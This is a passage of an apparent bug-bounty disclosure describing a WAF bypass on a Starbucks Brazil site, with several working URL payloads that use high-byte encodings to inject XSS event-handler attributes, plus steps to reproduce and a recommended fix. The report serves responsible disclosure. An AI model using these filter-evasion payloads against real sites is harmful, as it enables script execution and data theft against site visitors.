After a while I found out that the previously reported issue was not properly resolved as I was able to bypass the double encoding filter.\n\nThe original payload on the report was something like this:\n```\nhttps://www.starbucks.com.br/testing%2522%2520accesskey='x'%2520onclick='confirm%601%60'\n```\nand it got resolved. But you can bypass the filter with this:\n```\nhttps://www.starbucks.com.br/testing%2522%80%2520accesskey='x'%2520onclick='confirm%601%60'\n```\nNotice the `%80` between `%2522` and `%2520`. In fact, you can replace the `%80` with any hex value __beyond `%7f`__  and the payload still works (there's a couple of exceptions throwing \"Bad Request\" errors:  `%81`, `%8d`, `%8f`, `%90`, and `%9d`), but values in the range `%00-%7f` get properly filtered out (throwing custom \"Server Error\" pages and 404 pages, 301 and 302 redirect pages, and default 400 Bad Request errors, depending on the value)\n\nSo, this payload works:\n```\nhttps://www.starbucks.com.br/testing%2522%FF%2520accesskey='x'%2520onclick='confirm%601%60'\n```\nbut this one doesn't:\n```\nhttps://www.starbucks.com.br/testing%2522%7F%2520accesskey='x'%2520onclick='confirm%601%60'\n```\n\nThere is a similar behaviour if you put the double-hex digit first.\nThis payload breaks the filter:\n```\nhttps://www.starbucks.com.br/testing%80%2522%2520accesskey='x'%2520onclick='confirm%601%60'\n```\nbut this one doesn't:\n```\nhttps://www.starbucks.com.br/testing%7F%2522%2520accesskey='x'%2520onclick='confirm%601%60'\n```\n\n**Platform(s) Affected:** Firefox 69.0.3\n\n## Steps To Reproduce:\n\n  1. Visit this link on Firefox: \n\n```\nhttps://www.starbucks.com.br/testing%2522%80%2520accesskey='x'%2520onclick='confirm%601%60'\n```\n\n  2. Press CONTROL+ALT+X on Mac, or ALT+SHIFT+X on Windows\n\n## Recommendations for fix\nThe range of hex values `%80-%FF` is breaking the WAF filter, those values need to be filtered out just like the range `%00-%7F` is being filtered out.\n\n## Impact\n\nAs the original report said:\n\"JavaScript is against Starbucks users on multiple critical domains. JavaScript execution results in information theft and an attacker can perform unwanted actions on a victim's behalf\".","vulnerability_information_html":"\u003cp\u003e\u003cstrong\u003eSummary:\u003c/strong\u003e Report \u003ca href=\"https://hackerone.com/reports/629745\"\u003e629745\u003c/a\u003e not properly resolved: \u0026quot;Many Starbucks websites are vulnerable to cross-site scripting on 404 pages because double quotes lack sanitizing in hidden input tags, which leads to JavaScript execution\u0026quot;.\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003eDescription:\u003c/strong\u003e\u003cbr\u003e\nReport 629745 caught my attention, so I began testing the WAF to see if I could find any other issues.
